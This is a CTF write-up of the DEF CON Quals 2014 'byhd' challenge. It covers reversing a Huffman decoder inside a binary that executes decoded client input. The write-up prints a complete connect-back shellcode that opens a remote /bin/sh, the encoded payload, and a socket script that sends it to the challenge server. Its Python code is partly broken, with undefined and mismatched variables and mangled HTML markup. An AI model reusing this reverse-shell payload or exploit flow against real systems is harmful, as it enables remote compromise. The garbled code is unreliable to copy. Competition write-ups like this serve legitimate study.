---
title: Defcon CTF Quals 2014 – byhd
author: zepvn
layout: post
categories:
  - ctf
  - security
tags:
  - defcon
  - reversing
excerpt: Reversing a Huffman tree embedded in the binary.
---
Challenge description:

> Who hath lived like hacker&#8217;s life and refused the normalness must be rewarded with straw, sticks and bricks.
> 
> http://services.2014.shallweplayaga.me/byhd_147e0accdae13428910e909704b21b11
> 
> byhd_147e0accdae13428910e909704b21b11.2014.shallweplayaga.me 

In this challenge we need to connect to a service at `byhd_147e0accdae13428910e909704b21b11.2014.shallweplayaga.me:9730`. The binary file is given [here][1]

<!--more-->

The main handler function is at `0x401a15` which could be described by this pseudo code:

<div class="code-embed-wrapper">
  <pre class="language-c code-embed-pre line-numbers" ><code class="language-c code-embed-code">
sub_401a15():
    Read content of running binary file, store to (char*) binary_buffer
    Read 4 bytes from client, store to (int) N
    if N &lt; 256:
        Read N bytes from client, store to (char*) input_buffer
        Call function at 0x40173b: (char*) new_buffer_1 = sub_40173b(binary_buffer, sizeof(binary_buffer))
        Call function at 0x401f6b: (char*) new_buffer_2 = sub_401f6b(new_buffer_1)
        Call function at 0x402233: sub_402233(new_buffer_2)
        Call function at 0x40185a: (char*) transformed_input_buffer = sub_40185a(new_buffer_2, input_buffer)t
        (void*) mem = mmap(0, sizeof(transformed_input_buffer), READ|WRITE|EXEC, 0x22, -1, 0)
        memcpy(mem, transformed_input_buffer, sizeof(transformed_input_buffer))
        (mem)()
        munmap(mem, sizeof(transformed_input_buffer))
&#091;/pastacode&#093;

Basically the service allows client to send up to 255 bytes as raw input, then transforms it by the function at &lt;code&gt;0x40185a&lt;/code&gt; before executing it. So what we could do is to send a &lt;code&gt;input_buffer&lt;/code&gt; that makes &lt;code&gt;transformed_input_buffer&lt;/code&gt; a valid shellcode.&lt;/p&gt;
&lt;p&gt;We don&#8217;t need to understand what it does in &lt;code&gt;sub_40173b&lt;/code&gt;, &lt;code&gt;sub_401f6b&lt;/code&gt;, and &lt;code&gt;sub_402233&lt;/code&gt; as their inputs are all derrived from the content of the running binary (which is static), that means the output is static regardless of our input. We will try to grab it later on.&lt;/p&gt;
&lt;p&gt;We use Hopper to decompile the function at &lt;code&gt;0x40185a&lt;/code&gt; that receives our original input and transform it. Hopper doesn&#8217;t do well with looping so we have to touch up the code a bit, the final code looks like:&lt;/p&gt;
[pastacode lang="c++" message="" highlight="" provider="manual"]
function sub_40185a(char* new_buffer_2, char* input_buffer, int size) {
    char* output_buffer = null;
    char next_byte = 0&#215;0;
    int index = 0&#215;0;
    var_44 = 0&#215;0;
    var_56 = 0&#215;0;
    if ((new_buffer_2 != 0&#215;0) && (input_buffer != 0&#215;0) && (size != 0))  {
        var_44 = size * 4;
        output_buffer = _malloc(var_44);
        if (output_buffer != 0&#215;0) {
            // loc_4018f5;
            memset(output_buffer, 0&#215;0, var_44) != -1)
            // loc_4018f6;
            while (next_byte != -1) {
                next_byte = (byte) sub_40127c(new_buffer_2, input_buffer);
                if (next_byte != -1) {
                    output_buffer[index] = var_36;
                    index += 1;
                    if (LODWORD(index) &gt;= var_44) {
                        var_44 = var_44 &lt;&lt; 0x1;
                        char* temp_buffer = (char*) _malloc(var_44);
                        _memset(temp_buffer, 0x0, var_44);
                        _memcpy(temp_buffer, output_buffer, LODWORD(LODWORD(var_44) &gt;&gt; 0&#215;1));
                        _memset(output_buffer, 0&#215;0, LODWORD(LODWORD(var_44) &gt;&gt; 0&#215;1));
                        _free(output_buffer);
                        output_buffer = temp_buffer;
                    }
                }
            }
        }
    }
    return output_buffer;
}
</code></pre>
  
  <div class="code-embed-infos">
    <span class="code-embed-name"></span>
  </div>
</div>

We see that it keeps getting new bytes by calling `sub_40127c` and append them to `output_buffer` until that function returns `0xffffffff`. We continue reversing `sub_40127c`:

<div class="code-embed-wrapper">
  <pre class="language-c code-embed-pre line-numbers" ><code class="language-c code-embed-code">
int sub_40127c(char* new_buffer_2, char* input_buffer) {
    int final_byte = 0xffffffff;
    current_address = new_buffer_2;
    if ((new_buffer != 0&#215;0) && (input_buffer != 0&#215;0)) {
            int counter = *(int32_t *)(&input_buffer[8]);
            int limit   = *(int32_t *)(&input_buffer[12]);
            while ((*current_address != 0&#215;0) && (counter &lt; limit)) {
                    int byte_index = counter / 8;
                    int bit_index  = counter % 8;
                    if (input_buffer&#091;byte_index&#093; &gt;&gt; (7-bit_index)) == 1 {
                        current_address = *(current_address + 0&#215;8);
                    } else {
                        current_address = *current_address;
                    }
                    counter ++;
            }
            input_buffer[8] = counter;
            if (*current_address == 0&#215;0) {
                    final_byte = *(int8_t *)(current_address + 0&#215;10);
            }
    }
    return final_byte;
}
 </code></pre>
  
  <div class="code-embed-infos">
    <span class="code-embed-name"></span>
  </div>
</div>

So it looks that the function initializes the pointer `current_address` pointing to `new_buffer_2` then loops through every bit of `input_buffer` and change the `current_address` to either `*current_address` or `*(current_address + 0x8)` depends on whether the current bit of `input_buffer` is 0 or 1 respectively. The process stops when value of `current_address` is 0 and function returns `*(current_address + 0x10)`

For instance, if the bit stream of `input_buffer` is `100111011..`, the `current_address` would jump as:

         1                      0                     0                    1
    current_address -> *(current_address) -> *(current_address) -> *(current_address + 8 ) -> ... -> final_address
    // it stops somewhere when *(final_address) == 0
    

So we could start from the address of `new_buffer_2`, then recursively jump to `*(new_buffer_2 + 8)` and `*new_buffer_2` and so on to get all the cases that might happen in that function (ie. get all the outputs and their corresponding bit streams)

Since the output also depends on `new_buffer_2`, we need to grab its content. Taking a closer look at the assembly code where `sub_40127c` is called:

    0x0000000000401912: mov    -0x38(%rbp),%rax
    0x0000000000401916: mov    %rdx,%rsi
    0x0000000000401919: mov    %rax,%rdi
    0x000000000040191c: callq  0x40127c
    0x0000000000401921: mov    %eax,-0x2c(%rbp)
    0x0000000000401924: cmpl   $0xffffffff,-0x2c(%rbp)
    0x0000000000401928: je     0x401a02
    

We set the breakpoint at `0x40191c` (right before `sub_40127c` is called):

    # gdb ./byhd_147e0accdae13428910e909704b21b11 
    (gdb) set scheduler-locking step
    (gdb) br *0x40191c
    (gdb) r
    

Then write a simple Python code to generate some random payload:

<div class="code-embed-wrapper">
  <pre class="language-python code-embed-pre line-numbers" ><code class="language-python code-embed-code">
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((&#8217;10.37.129.4&#8242;, 9730)) # This is the local IP address of our box
s.send(&#8220;\xff\x00\x00\x00&#8243;)
s.send(&#8220;A&#8221;*255)
</code></pre>
  
  <div class="code-embed-infos">
    <span class="code-embed-name"></span>
  </div>
</div>

gdb now stops at our breakpoint and we start dumping the memory. We simply grab everything readable in the memory just to be safe, in this case we read from `0x603000` to `0x625fff`

    (gdb) x/143360 0x603000
    0x603000:  0x08070c1b  0x10070190  0x00000014  0x0000001c
    0x603010:   0xffffe180  0x0000002a  0x00000000  0x00000000
    0x603020:   0x00000014  0x00000000  0x00527a01  0x01107801
    0x603030:   0x08070c1b  0x00000190  0x00000024  0x0000001c
    .....
    

Also get the address of `new_buffer_2`:

    (gdb) info registers rdi
    rdi      0x603000      6303744
    

So we got the content of memory and the starting point now, this Python code helps to generate the case tree:

<div class="code-embed-wrapper">
  <pre class="language-python code-embed-pre line-numbers" ><code class="language-python code-embed-code">
import sys
s = &#8220;&#8221;&#8221;0&#215;603000:  0x08070c1b  0&#215;10070190  0&#215;00000014  0x0000001c
0&#215;603010:   0xffffe180  0x0000002a  0&#215;00000000  0&#215;00000000
0&#215;603020:   0&#215;00000014  0&#215;00000000  0x00527a01  0&#215;01107801
0&#215;603030:   0x08070c1b  0&#215;00000190  0&#215;00000024  0x0000001c
0&#215;603040:   0xffffde60  0x000002f0  0x46100e00  0x0f4a180e
&#8230;
(snip .. snip .. too long to paste here)
&#8230;.
0x625fd0:   0&#215;00000000  0&#215;00000000  0&#215;00000000  0&#215;00000000
0x625fe0:   0&#215;00000000  0&#215;00000000  0&#215;00000000  0&#215;00000000
0x625ff0:   0&#215;00000000  0&#215;00000000  0&#215;00000000  0&#215;00000000&#8243;&#8221;&#8221;
memory = {}
for line in s.split(&#8220;\n&#8221;):
    for value in line.split()[1:]:
        memory[start] = value
        start += 4
rdi    = 0x60e1e0
queue  = [rdi]
values = set()
while len(queue) &gt; 0:
    item    = queue.pop(0)
    mem     = memory[item]
    if eval(mem) ==0:
        values.add(memory[item+16])
        v = chr(int(memory[item+16][8:], 16))
        if v not in before:
            before[v] = item
    if eval(mem) !=0 and mem not in values:
        queue.append(eval(mem))
        if eval(mem) not in before:
            before[eval(mem)] = item
    mem  = memory[item+8]
    if eval(mem) !=0 and mem not in values:
        queue.append(eval(mem))
        if eval(mem) not in before:
            before[eval(mem)] = item
</code></pre>
  
  <div class="code-embed-infos">
    <span class="code-embed-name"></span>
  </div>
</div>

A bit explanation on that Python code, after everything is done:

  * If we have `before[an_address] == another_address`, that says in order to reach `another_address` the function needs to jump to `an_address` first.
  * We also have `before[a_character] ==  address` that indicates the function needs to jump to `address` to return `a_character`.

With that data we could trace back the bit stream for any character by starting from `before[character]`.

For example with character &#8216;H&#8217;, we got the steps:

    0x60e1e0  ->  address = *(address + 8) -> 1
    0x60e1b0  ->  address = *(address + 8) -> 1
    0x60e180  ->  address = *(address)     -> 0
    0x60e0f0  ->  address = *(address + 8) -> 1
    0x60e000  ->  address = *(address)     -> 0
    0x608fc0  ->  'H'
    

So we need 5 bits &#8217;11010&#8242; from raw_input to get &#8216;H&#8217; in final output.

We extend that Python code a bit to build the input from the shellcode, in this case we use a connect-back shellcode (Thanks <a href="http://twitter.com/manhluat93" title="@manhluat93" target="_blank">@manhluat93</a> for this awesome shellcode).

<div class="code-embed-wrapper">
  <pre class="language-python code-embed-pre line-numbers" ><code class="language-python code-embed-code">
&#8230;.
shellcode = &#8216;H1\xd2H1\xc0\xb2\x02H\x89\xd7\xb2\x01H\x89\xd6\xb2\x06\xb0)\x0f\x05H\x89\xc7H1\xc0P\xbb\xd2\xd3}UH\xc1\xe3 f\xb8\x11\\\xc1\xe0\x10\xb0\x02H\t\xd8PH\x89\xe6H1\xd2\xb2\x10H1\xc0\xb0*\x0f\x05H1\xf6H1\xc0\xb0!\x0f\x05H1\xc0\xb0!H\xff\xc6\x0f\x05H1\xc0\xb0!H\xff\xc6\x0f\x05H1\xf6H1\xd2RH\xbf//bin/shWH\x89\xe7H1\xc0\xb0;\x0f\x05\xc3&#8242;
bitstream  = &#8220;&#8221;
for item in shellcode:
    next_stream = &#8220;&#8221;
    while before[item] != None:
        if before[item] != None:
            if eval(memory[before[item]]) == item:
                next_stream = &#8220;0&#8243; + next_inp
            elif eval(memory[before[item]+8]) == item:
                next_stream = &#8220;1&#8243; + next_inp
            else:
                pass
        item = before[item]
    bitstream = bitstream + next_inp
# The result would be: bitstream = &#8217;1010101010010100101&#8230;.&#8217;
raw_inp  = &#8220;&#8221;
for i in range(len(inp)/8):
    s = bitstream[i*8:i*8+8]
    raw_inp += chr(int(s,2))
print repr(raw_inp)
</code></pre>
  
  <div class="code-embed-infos">
    <span class="code-embed-name"></span>
  </div>
</div>

And we got the output:

`<br />
'\xd7_\xe0\x9a\xeb\xec\xea\x0bv\xbd\x90\n\x82\x9f^\xccu\x05\xf3\xfa=\x0f\x0f\xd7\xafsk\xaf\xb3\xae\xd3\x9e\t@\xb915\xbep[\xb9m\xee\x0e\xf0\xef\x9b|<em>Gv\xae\x1b\xfa\xee\xbd\xb05\xd7\xf8%Aqk\xaf\xb3\xfa57\x87\xeb\xd7</em>|5\xd7\xd9\xfd\x19\x8b\xc3\xf5\xeb\xaf\xb3\xfa3\x17Q\xf0\xf0\xfdz\xeb\xec\xfe\x8c\xc5\xd4|<?^\xba\xfb\xe1\xae\xbf\xc1&\xf5\x83\xe0&#92;\x0bi\xcf\xf2\xf0*:\xba\xe25\xedF\xd7_g\xf4x\x0f\x0f\xd7\xb5'<br />
`

Try to send this to the real service:

  
import socket  
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)  
s.connect((&#8216;byhd_147e0accdae13428910e909704b21b11.2014.shallweplayaga.me&#8217;, 9730))  
s.send(&#8220;\xff\x00\x00\x00&#8243;)  
s.send(&#8216;\xd7\_\xe0\x9a\xeb\xec\xea\x0bv\xbd\x90\n\x82\x9f^\xccu\x05\xf3\xfa=\x0f\x0f\xd7\xafsk\xaf\xb3\xae\xd3\x9e\t@\xb915\xbep[\xb9m\xee\x0e\xf0\xef\x9b|\_Gv\xae\x1b\xfa\xee\xbd\xb05\xd7\xf8%Aqk\xaf\xb3\xfa57\x87\xeb\xd7_|5\xd7\xd9\xfd\x19\x8b\xc3\xf5\xeb\xaf\xb3\xfa3\x17Q\xf0\xf0\xfdz\xeb\xec\xfe\x8c\xc5\xd4|<?^\xba\xfb\xe1\xae\xbf\xc1&#038;\xf5\x83\xe0\\\x0bi\xcf\xf2\xf0*:\xba\xe25\xedF\xd7_g\xf4x\x0f\x0f\xd7\xb5'+'B'*100)
[/pastacode]

Since it's a connect-back shell, we got a shell from our server and simply read the flag


<pre>

`cat flag
The flag is: What a cold ass gershnoskel.
`</pre> 

## Some facts

  * The binary requires user `byhd` to exist in the system so we need to create a new system user before running the binary on our box. I had to run it as `root` otherwise some of the initialization functions would fail.</p> 
  * It was hard to debug the resulting shellcode as we have to set the break point and examine the memory from time to time. So I had an idea to change the binary so that it could send back the final output to client. It&#8217;s obviously not possible to patch the binary as its content is one of the factor to generate the final shellcode.

I came up with the following gdb commands to patch the instructions at runtime:

    # gdb ./byhd_147e0accdae13428910e909704b21b11 
    (gdb) br *0x4011ad  # Make it stop at entry point
    (gdb) r
    Starting program: /tmp/byhd_147e0accdae13428910e909704b21b11 
    [Thread debugging using libthread_db enabled]
    Breakpoint 1, 0x00000000004011ad in ?? ()
    (gdb) set *(unsigned char*)0x401c56=0x74
    (gdb) set *(unsigned char*)0x401c6c=0xff
    (gdb) set *(unsigned char*)0x401c64=0x48
    (gdb) set *(unsigned char*)0x401c65=0x8b
    (gdb) set *(unsigned char*)0x401c66=0x4d
    (gdb) set *(unsigned char*)0x401c67=0xe8
    (gdb) c
    

What it does is to change the following assembly code:

    0x0000000000401c52: cmpl   $0x0,-0x28(%rbp)      # This is to check if mmap was called succesfully or not.
    0x0000000000401c56: jne    0x401c86              # Jump if success
    0x0000000000401c58: mov    -0x18(%rbp),%rax
    0x0000000000401c5c: mov    %rax,%rdi
    0x0000000000401c5f: callq  0x400eb0 <free@plt>
    0x0000000000401c64: lea    -0x4c(%rbp),%rcx      # Assign the address of some buffer to be sent back
    0x0000000000401c68: mov    -0x54(%rbp),%eax
    0x0000000000401c6b: mov    $0xff,%edx
    0x0000000000401c70: mov    %rcx,%rsi
    0x0000000000401c73: mov    %eax,%edi
    0x0000000000401c75: callq  0x400ef0 <write@plt>  # Write buffer to socket
    

To:

    0x0000000000401c52: cmpl   $0x0,-0x28(%rbp)
    0x0000000000401c56: je     0x401c86               # Don't jump if success
    0x0000000000401c58: mov    -0x18(%rbp),%rax
    0x0000000000401c5c: mov    %rax,%rdi
    0x0000000000401c5f: callq  0x400eb0 <free@plt>
    0x0000000000401c64: mov    -0x18(%rbp),%rcx       # I assign the address of final shellcode here
    0x0000000000401c68: mov    -0x54(%rbp),%eax
    0x0000000000401c6b: mov    $0xff,%edx
    0x0000000000401c70: mov    %rcx,%rsi
    0x0000000000401c73: mov    %eax,%edi
    0x0000000000401c75: callq  0x400ef0 <write@plt>
    

After that&#8217;s done we always get back our final shellcode every time we send a raw input which is really convenient for debugging.

 [1]: http://zepvn.com/uploads/2014/05/byhd_147e0accdae13428910e909704b21b11.tar.gz
